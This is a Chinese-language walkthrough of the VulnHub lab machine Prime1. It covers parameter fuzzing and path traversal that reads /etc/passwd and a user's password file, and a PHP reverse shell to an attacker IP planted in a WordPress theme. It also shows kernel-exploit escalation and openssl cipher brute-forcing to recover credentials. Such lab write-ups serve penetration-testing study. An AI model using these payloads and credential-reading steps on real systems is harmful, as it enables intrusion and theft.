---
{"dg-publish":true,"title":"vulnhub_Prime1","dg-path":"安全/靶机/vulnhub_Prime1.md","permalink":"/安全/靶机/vulnhub_Prime1/","dgPassFrontmatter":true}
---

开放80端口
![Pasted image 20250123173609.png](/img/user/picture/Pasted%20image%2020250123173609.png)

## 目录扫描
```shell
sudo gobuster dir -u http://192.168.1.63/ --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
![Pasted image 20250123173701.png](/img/user/picture/Pasted%20image%2020250123173701.png)





首先主页就是一张图片，没什么有用信息：
![Pasted image 20250123173741.png](/img/user/picture/Pasted%20image%2020250123173741.png)
## 目录 `/dev`


算是给我们的忠告？但是好像没什么用
![Pasted image 20250123183504.png](/img/user/picture/Pasted%20image%2020250123183504.png)

经过进一步扫描，发现了一个新的目录
![Pasted image 20250123184951.png](/img/user/picture/Pasted%20image%2020250123184951.png)

文件`/secret.txt`
![Pasted image 20250123185014.png](/img/user/picture/Pasted%20image%2020250123185014.png)

给的提示是要我们在能找到的所有php文件中做模糊测试，并且给了一个github地址
https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web

而且还得到一个文件名`location.txt`

我们能找到的php文件如下：
![Pasted image 20250123185308.png](/img/user/picture/Pasted%20image%2020250123185308.png)


```
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hw 12 http://192.168.1.63/index.php\?FUZZ\=something
```

![Pasted image 20250123190124.png](/img/user/picture/Pasted%20image%2020250123190124.png)
挖出来一个参数`file`
![Pasted image 20250123190210.png](/img/user/picture/Pasted%20image%2020250123190210.png)
提示是挖错文件了
![Pasted image 20250123190746.png](/img/user/picture/Pasted%20image%2020250123190746.png)
得到新的提示，用参数`secrettier360`,在另一个文件上挖
![Pasted image 20250123191251.png](/img/user/picture/Pasted%20image%2020250123191251.png)


```shell
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hw 17 "http://192.168.1.63/image.php?secrettier360=FUZZ"
```
![Pasted image 20250123192508.png](/img/user/picture/Pasted%20image%2020250123192508.png)

我们发现有个`dev`
![Pasted image 20250123192535.png](/img/user/picture/Pasted%20image%2020250123192535.png)
我们发现就是我们之前看的文件，可以判断这里存在**文件包含**

```
http://192.168.1.63/image.php?secrettier360=../../../../../../../../etc/passwd
```
发现可以读取，有效信息：
```
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```
也就是存在用户`victor`和`saket`
并且用户`saket`目录下有个`password.txt`

查看一下这个password.txt
![Pasted image 20250123193453.png](/img/user/picture/Pasted%20image%2020250123193453.png)
`follow_the_ippsec`

这个密码尝试进行ssh登录，未果


## 目录`wordpress/`
![Pasted image 20250123173810.png](/img/user/picture/Pasted%20image%2020250123173810.png)

![Pasted image 20250123174911.png](/img/user/picture/Pasted%20image%2020250123174911.png)


简单浏览一下可以看到`victor`是这里面用户之一
![Pasted image 20250123194044.png](/img/user/picture/Pasted%20image%2020250123194044.png)
其实也有专门对wordpress进行扫描的工具`wpscan`
因为wordpress是使用量最多的CMS

==//我发现我虚拟机网络有问题，弄了半天没弄好==


看到有登录入口
![Pasted image 20250123194058.png](/img/user/picture/Pasted%20image%2020250123194058.png)
我们尝试用上面的密码登陆一下，成功
`follow_the_ippsec`


在后台主题中插入payload
![Pasted image 20250123214130.png](/img/user/picture/Pasted%20image%2020250123214130.png)
访问对应主题文件
`http://192.168.1.63/wordpress/wp-content/themes/twentynineteen/secret.php`

```
<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.55/443 0>&1 '")  ?>
```
![Pasted image 20250123214209.png](/img/user/picture/Pasted%20image%2020250123214209.png)


## 提权——系统内核

![Pasted image 20250123215443.png](/img/user/picture/Pasted%20image%2020250123215443.png)

![Pasted image 20250123215543.png](/img/user/picture/Pasted%20image%2020250123215543.png)

![Pasted image 20250123215701.png](/img/user/picture/Pasted%20image%2020250123215701.png)


漏洞利用很简单，就编译一下执行就可以了
![Pasted image 20250123215816.png](/img/user/picture/Pasted%20image%2020250123215816.png)


在本地的80端口开一个服务
```
sudo php -S 0:80
```

![Pasted image 20250123220111.png](/img/user/picture/Pasted%20image%2020250123220111.png)
![Pasted image 20250123220152.png](/img/user/picture/Pasted%20image%2020250123220152.png)

![Pasted image 20250123220223.png](/img/user/picture/Pasted%20image%2020250123220223.png)

//内核漏洞通常太过于暴力，容易影响运行服务的崩溃，要尽量避免使用内核漏洞进行提权

## 提权 ——openssl
![Pasted image 20250123214644.png](/img/user/picture/Pasted%20image%2020250123214644.png)

发现我们有一个不需要密码就可以高权限执行的文件：`/home/saket/enc`
![Pasted image 20250124111321.png](/img/user/picture/Pasted%20image%2020250124111321.png)
执行这个文件需要密码，猜测这个密码可能会存在在机器上的某一个位置作为备份
所以我们就去用find找找

```
 find / -name '*backup*' 2>/dev/null
```

![Pasted image 20250124112336.png](/img/user/picture/Pasted%20image%2020250124112336.png)
![Pasted image 20250124112554.png](/img/user/picture/Pasted%20image%2020250124112554.png)

这个文件告诉了enc的密码
```enc
backup_password
```

运行后发现增加了两个文件
![Pasted image 20250124114833.png](/img/user/picture/Pasted%20image%2020250124114833.png)
enc.txt
```shell
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
```

 key.txt
 ```shell
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

```shell
 sudo echo -n 'ippsec' | md5sum
```
![Pasted image 20250124115846.png](/img/user/picture/Pasted%20image%2020250124115846.png)
注意：这里的`-n`是不输出结尾的换行符

加密后的结果为
```
366a74cb3c959de17d61db30591c39d1  -
```
注意到后面有一个`-`,这里指的是输入是从标准输入（如管道 `|` 或重定向）而非文件中读取的
我们可以使用awk工具更"美化"一点
```shell
sudo echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1}'
```
![Pasted image 20250124120508.png](/img/user/picture/Pasted%20image%2020250124120508.png)
```txt
366a74cb3c959de17d61db30591c39d1
```

### openssl暴力破解密码

由于我们不知道它使用了哪一种加密方式，所以我们需要枚举每一种加密，
首先**构造加密方式字典**：
首先我们在`openssl -help`中找到所有加密方式先保存下来`cipher_type_raw`
![Pasted image 20250124131807.png](/img/user/picture/Pasted%20image%2020250124131807.png)

```shell
tr -s ' ' '\n' < cipher_type_raw > cipher_type
```
 **解释：**

1. `tr` 是用于替换或删除字符的命令。
2. `-s ' '` 会将文件中连续的空格压缩成一个空格。
3. `'\n'` 将空格替换为换行符，从而实现每个数据单独占一行。
4. `< cipher_type_raw` 是将文件内容作为 `tr` 的输入。
5. `> cipher_type` 是将输出保存到新文件 `cipher_type` 中。


![Pasted image 20250124141214.png](/img/user/picture/Pasted%20image%2020250124141214.png)
由于openssl中密钥的格式要求为16进制格式，所以我们需要将密码再进行一次**16进制编码**
```shell
echo -n "366a74cb3c959de17d61db30591c39d1" | xxd -p | tr -d '\n'
```

![Pasted image 20250124141339.png](/img/user/picture/Pasted%20image%2020250124141339.png)
```txt
3336366137346362336339353964653137643631646233303539316333396431
```
注意：
+ xdd工具默认每30个字节换一行，所以后面要去掉换行
+ 最后这个%是zsh的特性，由于在终端中输出的内容最后没有换行符，所以zsh用一个`%`来标识



所以我们现在解密的大致框架如下：
```shell
echo -n 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' | openssl enc -d -a -<ciphername> -K 3336366137346362336339353964653137643631646233303539316333396431
```

//注意最前面那个`-n`有可能会有问题，所以后面也要把`-n`去掉再试一遍

```shell
for cipher in $(cat cipher_type);do echo  'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null;done
```

![Pasted image 20250124143254.png](/img/user/picture/Pasted%20image%2020250124143254.png)

```txt
Dont worry saket one day we will reach to
our destination very soon. And if you forget
your username then use your old password
==> "tribute_to_ippsec"

Victor
```

其实很多加密方式所需要的密钥长度并不一样，我们现在破解出的密钥长度为32字节，就可以减少很多选项
![Pasted image 20250124143630.png](/img/user/picture/Pasted%20image%2020250124143630.png)

![Pasted image 20250124143740.png](/img/user/picture/Pasted%20image%2020250124143740.png)
```shell
echo  'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' | openssl enc -d -a -aes-256-ecb -K 3336366137346362336339353964653137643631646233303539316333396431 
```

![Pasted image 20250124143915.png](/img/user/picture/Pasted%20image%2020250124143915.png)

现在我们有了密码
```txt
tribute_to_ippsec
```


### 进一步提权

![Pasted image 20250124144144.png](/img/user/picture/Pasted%20image%2020250124144144.png)

![Pasted image 20250124144206.png](/img/user/picture/Pasted%20image%2020250124144206.png)
![Pasted image 20250124144303.png](/img/user/picture/Pasted%20image%2020250124144303.png)
进去之后可以先把bash升级一下
```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

可以推断出这个文件尝试去运行`/tmp/challenge`
![Pasted image 20250124144947.png](/img/user/picture/Pasted%20image%2020250124144947.png)
//不要忘了给`/tmp/challenge`加上可执行权限














